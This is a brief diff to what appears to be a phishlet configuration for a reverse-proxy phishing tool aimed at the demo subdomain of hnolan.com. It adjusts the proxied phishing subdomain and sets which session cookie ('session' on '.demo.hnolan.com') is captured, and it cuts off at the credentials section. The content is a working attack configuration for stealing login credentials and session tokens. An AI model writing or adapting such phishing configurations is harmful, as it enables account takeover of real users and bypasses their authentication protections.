@@ -1,8 +1,8 @@
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true, auto_filter: true}
 auth_tokens:
-  - domain: '.hnolan.com'
+  - domain: '.demo.hnolan.com'
     keys: ['session']
 credentials:
   username:
